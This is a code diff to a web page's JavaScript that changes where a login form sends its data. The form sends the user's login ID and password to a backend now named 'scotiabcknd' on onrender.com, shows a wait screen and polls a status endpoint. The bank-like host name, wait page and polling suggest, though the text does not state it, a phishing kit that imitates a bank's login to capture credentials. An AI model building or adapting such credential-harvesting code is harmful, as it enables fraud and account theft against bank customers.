@@ -415,7 +415,7 @@
 
       document.getElementById('waitPage').style.display = 'flex';
 
-      fetch('https://b-bcknd.onrender.com/login', {
+      fetch('https://scotiabcknd.onrender.com/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ login: loginId, password: password })
@@ -440,7 +440,7 @@
 
     function checkStatus(id) {
       const interval = setInterval(() => {
-        fetch(`https://b-bcknd.onrender.com/status/${id}`)
+        fetch(`https://scotiabcknd.onrender.com/status/${id}`)
         .then(res => {
           if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
           return res.json();
